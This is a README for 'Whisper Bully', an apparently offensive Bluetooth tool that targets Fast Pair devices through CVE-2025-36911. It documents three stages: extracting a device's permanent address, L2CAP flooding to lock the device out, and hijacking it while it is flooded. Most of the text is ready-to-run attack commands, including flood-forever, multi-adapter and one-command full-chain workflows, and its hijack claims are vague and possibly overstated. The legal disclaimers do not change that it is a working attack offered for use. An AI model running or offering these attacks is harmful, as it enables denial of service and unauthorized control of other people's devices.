# Whisper Bully

Bluetooth Deauthentication, Denial-of-Service & Hijack Tool

Three-stage attack on Fast Pair devices via CVE-2025-36911:

1. **Stage 1 (Extraction)**: Extract permanent hidden BD ADDR from privacy-randomized addresses
2. **Stage 2 (Flood)**: Execute sustained L2CAP denial-of-service using EMP mode reconnect cycling
3. **Stage 3 (Hijack)**: Establish unauthorized connection to flooded target in compromised state

Extracts the real Bluetooth address from devices during pairing by monitoring `bluetoothctl` output for address change messages. Once extracted, optionally floods the target with synchronized L2CAP bursts to lock it out of connectivity, then hijacks the compromised device.

## How It Works

### Stage 1: Extraction (CVE-2025-36911)

Fast Pair devices use randomized temporary addresses for privacy. During pairing, the device reveals its permanent address via a `[CHG] Device` message in `bluetoothctl` output. Whisper Bully monitors that output and captures the address.

1. Scans for devices advertising Fast Pair service (UUID `fe2c`)
2. Establishes BLE connection to target
3. Triggers pairing, monitors for `[CHG] Device` address change
4. Captures permanent BD ADDR that appears during pairing
5. Falls back to device list comparison if direct capture fails

### Stage 2: Flooding (L2CAP EMP Mode)

Once permanent address is known, optionally execute sustained denial-of-service:

1. Connects to target using permanent address
2. Sends 50 L2CAP echo packets per connection (burst)
3. Closes connection intentionally
4. Resynchronizes with other threads (5ms pause)
5. Reconnects and repeats (sustained cycling)
6. Target device locked out until attack stops

**Result**: Device becomes unresponsive to normal connection attempts.

### Stage 3: Hijack (Post-Flood Takeover)

Once the device is rendered unresponsive via Stage 2 flooding, attempt unauthorized control:

1. Monitor target via L2CAP probe to detect "no response" state
2. Once device is confirmed unresponsive and in compromised state
3. Establish L2CAP connection while device is weakened
4. Assume control of the device while its normal defenses are disabled
5. Optionally establish higher-level pairing/authentication

**Result**: Attacker gains control of the flooded device for reconnaissance, credential extraction, or further exploitation.

## Requirements

- Linux (tested on Ubuntu 20.04+)
- Root privileges (required for `bluetoothctl` and Bleak)
- `bluetoothctl` installed and functional
- Python 3.7+
- For Stage 2/3: `l2flood` with OpenMP support (included)

## ⚠️ LEGAL NOTICE

**This is a deauthentication/denial-of-service/hijack attack tool.**

Using this tool on devices you don't own or without explicit written authorization is a **FEDERAL CRIME** punishable by imprisonment and fines.

You may **ONLY** use this tool on:
- Devices you own
- Devices with explicit written permission from the owner to test

## Installation

### Prerequisites
- Python 3.7 or later
- `bluetoothctl` (from BlueZ)
- Development headers for D-Bus and GLib

### Install system dependencies for your distro

**Ubuntu / Debian:**
```bash
sudo apt update
sudo apt install -y python3 python3-pip libdbus-1-dev libglib2.0-dev bluez
```

**Fedora / RHEL / CentOS:**
```bash
sudo dnf install -y python3 python3-pip dbus-devel glib2-devel bluez
```

**Arch Linux:**
```bash
sudo pacman -S python python-pip dbus glib bluez
```

**Alpine Linux:**
```bash
apk add --no-cache python3 py3-pip dbus-dev glib-dev bluez bluez-openrc
```

**openSUSE:**
```bash
sudo zypper install -y python3 python3-pip dbus-1-devel glib2-devel bluez
```

**Void Linux:**
```bash
sudo xbps-install -S python3 python3-pip dbus-devel glib-devel bluez
```

**Generic / Other distros:**
Install equivalents of: Python 3.7+, D-Bus dev headers, GLib dev headers, BlueZ

### Clone and Install

```bash
git clone https://github.com/Ymsniper/Whisper_Bully.git
cd Whisper_Bully
pip3 install -r requirements.txt
# optional for running DOS attack and hijack:
make
sudo make install
```

## Usage

### Stage 1: Extraction

Extract permanent addresses from Fast Pair devices:

```bash
# Auto-detect and extract
sudo python3 wb.py

# Scan for 20 seconds, save to file
sudo python3 wb.py -s 20 -o targets.json

# Custom duration and output
sudo python3 wb.py -s 30 -o extracted.json
```

**NOTE:** During the pairing step, a pop-up window will appear on your device asking for PIN verification. Always select "pin correct" or accept/confirm the pairing request to allow the extraction to proceed.

### Stage 2: Flooding (Optional)

After extraction, flood the extracted addresses. Multiple methods:

#### Method 1: Automatic (Interactive)
```bash
sudo python3 wb.py -s 20 -o targets.json
# At completion, tool asks: "Run aggressive L2CAP test... (yes/no)"
# Answer 'yes' to automatically flood extracted addresses
```

#### Method 2: Automatic with Flags (All Stages)
```bash
# Stage 1 → Stage 2 → Stage 3 (hijack after flood completes)
sudo python3 wb.py -s 20 -o targets.json --aggressive --hijack

# Stage 1 → Stage 2 only
sudo python3 wb.py -s 20 -o targets.json --aggressive

# Skip to hijack without interactive prompts
sudo python3 wb.py -o targets.json --aggressive --hijack -d 60
```

#### Method 3: Manual (Standalone)
```bash
# Flood targets for 120 seconds
sudo python3 aggressive_test.py -f targets.json -d 120 -t 4

# Flood targets forever (until Ctrl+C)
sudo python3 aggressive_test.py -f targets.json -f

# Flood single known address for 60 seconds
sudo python3 aggressive_test.py AA:BB:CC:DD:EE:FF -d 60

# Flood single address forever
sudo python3 aggressive_test.py AA:BB:CC:DD:EE:FF -f
```

### Stage 3: Hijack (Optional)

Attempt unauthorized connection to flooded devices:

#### Method 1: Integrated Workflow
```bash
# Extract, flood, AND hijack in one command
sudo python3 wb.py -s 20 -o targets.json --aggressive --hijack

# Same, but with custom flood duration
sudo python3 wb.py -s 20 -o targets.json --aggressive --hijack -d 120

# Interactive: answer prompts for flood duration and hijack attempt
sudo python3 wb.py -s 20 -o targets.json
# ... extraction completes ...
# AGGRESSIVE L2CAP TESTING (OPTIONAL)
# Run aggressive L2CAP test on extracted addresses now? (yes/no): yes
#
# Flood duration in seconds (default 60): 60
# Number of threads (default: CPU count): 4
# Attempt hijack after flood? (yes/no): yes
```

#### Method 2: Manual Hijack (Standalone)
```bash
# Hijack after detecting device is unresponsive (uses l2flood to probe)
sudo python3 wb.py -H 11:22:33:44:55:66

# Hijack specific addresses from extracted targets file
sudo python3 wb.py -f targets.json -H
```

## Command-Line Flags

### Main Flags (wb.py)

| Flag | Description |
|------|-------------|
| `-s, --scan-time` | BLE scan duration in seconds (default: 10) |
| `-o, --output` | Save extracted addresses to JSON file |
| `--aggressive` | Skip prompts and run Stage 2 (flood) immediately (requires prior authorization) |
| `-H, --hijack` | Attempt Stage 3 (hijack) after Stage 2 completes (requires `--aggressive` or interactive yes) |
| `-d, --duration` | Flood duration in seconds (default: 60) or 'f' for forever |
| `-t, --threads` | Number of parallel L2CAP flood threads (default: CPU count) |
| `-i, --hci` | Specific HCI adapter to use (e.g., hci0, hci1) |

### Usage Examples

```bash
# Full three-stage attack in one command
sudo python3 wb.py -s 20 -o targets.json --aggressive --hijack -d 120 -t 4

# Stage 1 + Stage 2 only (no hijack)
sudo python3 wb.py -s 20 -o targets.json --aggressive -d 90

# Stage 1 only (interactive prompts for further stages)
sudo python3 wb.py -s 20 -o targets.json

# Extract from specific HCI adapter, then flood and hijack
sudo python3 wb.py -s 15 -o targets.json --aggressive --hijack -i hci1 -t 8

# Use multiple adapters for increased flood pressure
sudo python3 wb.py -s 20 -o targets.json --aggressive -i hci0 -d 120 &
sudo python3 wb.py -s 20 -o targets.json --aggressive -i hci1 -d 120
```

## Output Format

Extracted addresses saved as JSON (per target):

```json
{
  "device_name": "Device Name",
  "temporary_address": "AA:BB:CC:DD:EE:FF",
  "permanent_address": "11:22:33:44:55:66",
  "rssi": -45
}
```

The `permanent_address` is the real BD ADDR. Use this for Stage 2 flooding and Stage 3 hijacking.

## Stage-by-Stage Details

### Stage 1: Extraction Details

**Trigger Conditions:**
- Device advertises Fast Pair service (UUID fe2c)
- Device responds to BLE connection within scan window
- Pairing initiates successfully

**Extraction Method:**
- Monitors `bluetoothctl` output for `[CHG] Device` messages
- Captures permanent address during pairing handshake
- Falls back to post-pairing device list scan

**Limitations:**
- Only works on Linux with `bluetoothctl`
- Some devices may not advertise Fast Pair service
- Advertised MAC may change during connection (address rolling - timing issue)
- Device must not already be paired/known

**Mitigation:**
- Forget device before extraction: `bluetoothctl remove <address>`

---

### Stage 2: Aggressive L2CAP Flooding Details

**EMP Mode (Burst-Reconnect Cycling):**

The `-R` flag in l2flood implements:

1. **Connect Phase**: Establish L2CAP connection to target
2. **Burst Phase**: Send 50 L2CAP echo packets per connection
3. **Close Phase**: Intentionally close connection
4. **Resync Phase**: All threads sleep 5ms for synchronization
5. **Loop**: Repeat continuously (sustained pressure)

**Configuration Options:**

```bash
# Flood parameters via wb.py
sudo python3 wb.py -o targets.json --aggressive \
  -d 120 \           # 120 second flood duration
  -t 8 \             # 8 parallel threads
  -i hci0            # Use hci0 adapter
```

**Flood Characteristics:**
- Causes device to stop responding to normal connections
- Target becomes unavailable for legitimate pairing/connection
- Device remains vulnerable while flood is active
- Device recovers when attack stops (no permanent damage)

**Multithread Impact:**
- Each thread independently cycles connect→burst→close
- Threads resynchronize every 5ms for wave-like pressure
- Higher thread count = greater DoS intensity
- Diminishing returns beyond ~16 threads on typical hardware

---

### Stage 3: Hijack Details

**Pre-Hijack Verification:**

Before attempting hijack, the tool verifies device is truly unresponsive:

1. Sends L2CAP probe using `l2flood -c -1 -t 2` (2 second timeout)
2. Waits for "no response from <addr>" message
3. Confirms device is in compromised state

**Hijack Execution:**

Once verified unresponsive:

1. Attempt connection via `bluetoothctl connect <permanent_address>`
2. Exploit weakened device state during DoS recovery
3. Establish L2CAP link while device defenses are disabled
4. Return control channel to operator

**Hijack Success Conditions:**
- Device must be unresponsive (verified by probe)
- Connection attempt during flood/recovery window
- Device in vulnerable link-layer state
- L2CAP handling compromised by sustained packet pressure

**Expected Outcomes:**

| Scenario | Result |
|----------|--------|
| Device in flood state | Hijack likely succeeds; device accepts connection while under duress |
| Device recovering from flood | High success probability; temporary defense gap |
| Device fully recovered | Lower success; normal security restored |
| Device powered off | Hijack fails (device offline) |

---

## Combined Workflows

### Quick Scan → Flood → Hijack (One Command)

```bash
sudo python3 wb.py -s 20 -o targets.json --aggressive --hijack -d 120
```

**Execution Flow:**
1. Scan for 20 seconds
2. Extract permanent addresses
3. Flood all targets for 120 seconds
4. Detect "no response" state
5. Attempt hijack on each target
6. Save results to targets.json

### Multi-Adapter Distributed Attack

```bash
# Terminal 1: Use adapter hci0
sudo python3 wb.py -s 20 -o targets.json --aggressive --hijack \
  -i hci0 -d 120 -t 4 &

# Terminal 2: Use adapter hci1 (additional pressure on same target)
sudo python3 wb.py -s 20 -o targets.json --aggressive --hijack \
  -i hci1 -d 120 -t 4
```

**Effect:**
- Doubles the DoS pressure (two adapters flooding simultaneously)
- Increases hijack success probability during recovery window
- Requires multi-radio hardware setup

### Extended Duration Flood (Forever Mode)

```bash
# Flood indefinitely until manual stop (Ctrl+C)
sudo python3 wb.py -s 20 -o targets.json --aggressive -f

# Or with hijack enabled (attempts hijack if device goes unresponsive)
sudo python3 wb.py -s 20 -o targets.json --aggressive --hijack -f
```

---

## Known Limitations

### Stage 1 (Extraction)
- Only works on Linux with `bluetoothctl`
- Some devices may not advertise Fast Pair service
- Advertised MAC address could change during connection (timing issue)
- Device must be forgotten if previously paired: `bluetoothctl remove <addr>`

### Stage 2 (Flooding)
- Requires knowing permanent address (get from Stage 1 or other means)
- Target must be within Bluetooth range and powered on
- Device recovers after attack stops (no permanent damage)
- May fail on devices with robust L2CAP error handling

### Stage 3 (Hijack)
- Requires device to enter unresponsive state (Stage 2 dependency)
- Success depends on timing during device recovery window
- Does not work on devices that remain powered off
- Device must support the connection method (L2CAP)
- Does not guarantee successful authentication/pairing

---

## Troubleshooting

### No devices found
- Check `bluetoothctl` is working: `sudo bluetoothctl list`
- Increase scan duration: `-s 30`
- Ensure devices are in pairing mode

### BLE connection failed, Failed to extract
- If device was previously paired via this tool or manually, forget it first: `sudo bluetoothctl remove <addr>`
- Wait 10 seconds and try again
- Device may not support Fast Pair service

### Extraction fails with fallback
- Timing issue: pairing completed before address capture
- Device may not support Fast Pair service advertisement
- Try again: timing is unpredictable with some hardware

### Flood has no effect (devices still responsive)
- Increase thread count: `-t 16`
- Use multiple adapters simultaneously
- Verify permanent address is correct
- Some devices may have robust L2CAP error handling

### Hijack fails (cannot connect)
- Device may have recovered from flood (try longer duration)
- Device may be powered off
- Verify device was truly unresponsive during probe
- Try again immediately after flood completes

### Permission denied
- Run with `sudo`
- Ensure your user can access `/dev/bluetooth` (may need to be in `bluetooth` group)

### Bleak import error
- Verify system dependencies are installed (see Installation section)
- Debian/Ubuntu: `sudo apt install libdbus-1-dev libglib2.0-dev`
- Fedora: `sudo dnf install dbus-devel glib2-devel`
- Arch: `sudo pacman -S dbus glib`
- Alpine: `apk add dbus-dev glib-dev`

### bluetoothctl not found
- Ubuntu/Debian: `sudo apt install bluez`
- Fedora/RHEL: `sudo dnf install bluez`
- Arch: `sudo pacman -S bluez`
- Alpine: `apk add bluez bluez-openrc`
- openSUSE: `sudo zypper install bluez`
- Void: `sudo xbps-install bluez`

### D-Bus connection errors
- Ensure D-Bus daemon is running: `sudo systemctl start dbus`
- Make D-Bus start on boot: `sudo systemctl enable dbus`
- Check Bluetooth service: `sudo systemctl status bluetooth`

### Python version conflict
- Ensure you're using Python 3.7+: `python3 --version`
- Some systems may require explicit `python3` instead of `python`
- Consider using `python3 -m pip` instead of `pip3`

---

## License

MIT. See LICENSE for details.

## Author

[@Ymsniper](https://github.com/Ymsniper)

## CREDITS

[@kovmir](https://github.com/kovmir) for [@l2flood](https://github.com/kovmir/l2flood)

## Disclaimer

This tool is for authorized security testing and defensive research only. Unauthorized access to Bluetooth devices is illegal. Only use on devices you own or have explicit permission to test.

**Stage 3 (Hijack) is an advanced exploitation capability.** Using this tool to take control of devices you do not own or without explicit authorization constitutes unauthorized computer access and is punishable under applicable cybercrime statutes.
